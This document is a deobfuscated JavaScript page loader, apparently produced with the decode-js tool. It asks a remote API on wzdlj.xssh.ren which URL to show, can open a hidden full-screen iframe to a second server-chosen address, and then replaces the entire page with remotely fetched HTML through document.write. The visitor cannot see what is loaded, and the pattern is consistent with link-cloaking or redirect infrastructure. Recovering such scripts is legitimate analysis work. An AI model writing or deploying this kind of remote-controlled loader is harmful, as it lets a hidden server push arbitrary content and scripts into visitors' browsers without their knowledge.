//Wed Aug 28 2024 12:38:06 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const script = document.createElement("script");
script.src = "https://lib.baomitu.com/jquery/1.10.2/jquery.min.js";
document.head.appendChild(script);
let timer;
var code = getQueryVariable("code"),
  type = getQueryVariable("type"),
  u = getQueryVariable("u"),
  url = "";
script.onload = function () {
  $.ajax({
    "type": "GET",
    "url": "https://wzdlj.xssh.ren/api.php?act=getHtml&code=" + code + "&type=" + type + "&u=" + u,
    "dataType": "json",
    "success": function (_0xf49efd) {
      url = _0xf49efd.url;
      if (_0xf49efd.onload_switch == 1) {
        document.title = "提示";
        var _0x2d1473 = document.createElement("iframe");
        _0x2d1473.style.width = "100%";
        _0x2d1473.style.height = "100vh";
        _0x2d1473.style.border = "none";
        _0x2d1473.src = _0xf49efd.onload_url;
        var _0x567a8c = document.body || document.documentElement;
        _0x567a8c.appendChild(_0x2d1473);
        function _0x1a3819() {
          _0x567a8c.removeChild(_0x2d1473);
        }
        _0x2d1473.onload = function () {
          var _0x284f34 = document.body || document.documentElement;
          _0x284f34.removeChild(_0x2d1473);
          if (_0xf49efd.ctn == 1) $("#content").show(), timer = setTimeout(function () {
            loadhtml(_0xf49efd.url);
          }, 3000);else {
            loadhtml(_0xf49efd.url);
          }
        };
      } else {
        if (_0xf49efd.ctn == 1) {
          document.title = "提示";
          $("#content").show();
          timer = setTimeout(function () {
            loadhtml(_0xf49efd.url);
          }, 3000);
        } else loadhtml(_0xf49efd.url);
      }
      return false;
    }
  });
};
document.getElementById("changeButton").addEventListener("click", function () {
  clearTimeout(timer);
  loadhtml(url);
});
function getQueryVariable(_0x348a4b) {
  var _0x25e4e0 = window.location.search.substring(1),
    _0x3e511b = _0x25e4e0.split("&");
  for (var _0x3a6f95 = 0; _0x3a6f95 < _0x3e511b.length; _0x3a6f95++) {
    var _0xe09e46 = _0x3e511b[_0x3a6f95].split("=");
    if (_0xe09e46[0] == _0x348a4b) return _0xe09e46[1];
  }
  return false;
}
function loadhtml(_0xe5b14c) {
  var _0x3764ff = new XMLHttpRequest(),
    _0x4fc567 = null;
  function _0x15e8fc() {
    var _0x4b6ce6 = document.open("text/html", "replace");
    _0x4b6ce6.write(_0x4fc567);
    _0x4b6ce6.close();
  }
  _0x3764ff.onload = function () {
    _0x4fc567 = _0x3764ff.responseText;
    var _0x5170df = 0;
    if (_0x5170df > 0) setTimeout("render()", _0x5170df * 1000);else _0x15e8fc();
  };
  _0x3764ff.open("GET", _0xe5b14c + window.location.search + "&_=" + new Date().getTime(), !0);
  _0x3764ff.send();
}